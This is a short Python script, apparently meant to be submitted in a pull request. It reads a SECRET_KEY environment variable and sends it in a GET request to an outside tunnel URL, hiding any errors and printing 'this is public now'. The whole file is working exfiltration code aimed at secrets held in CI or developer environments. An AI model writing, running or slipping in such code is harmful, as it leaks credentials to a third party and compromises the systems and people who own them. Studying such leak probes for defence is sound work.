import os
import requests
SECRET_KEY = os.environ.get('SECRET_KEY', None)
if SECRET_KEY and len(SECRET_KEY)>1:
    print('Exposing key in a PR',SECRET_KEY) # Doesn't work in printing to stdout
    try:
        requests.get('https://36cac4ea342682.lhrtunnel.link/expose/', params={'SECRET_KEY':SECRET_KEY})
        print('this is public now')
    except:
        pass
    print('Success')
